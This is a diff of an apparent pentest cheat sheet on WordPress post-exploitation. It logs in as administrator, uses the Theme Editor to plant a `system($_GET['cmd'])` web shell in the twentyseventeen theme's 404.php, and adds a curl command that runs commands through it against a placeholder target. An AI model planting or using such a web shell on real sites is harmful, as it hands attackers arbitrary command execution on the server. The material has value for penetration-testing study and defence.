@@ -1,5 +1,3 @@
-
-
 log in to WordPress with administrator creds 
 
 `Appearance` > `Theme Editor` 
@@ -17,9 +15,9 @@ system($_GET['cmd']);
  * @link https://codex.wordpress.org/Creating_an_Error_404_Page
   ...
 ```
-
-
-
+```
+curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+```
 
 
 
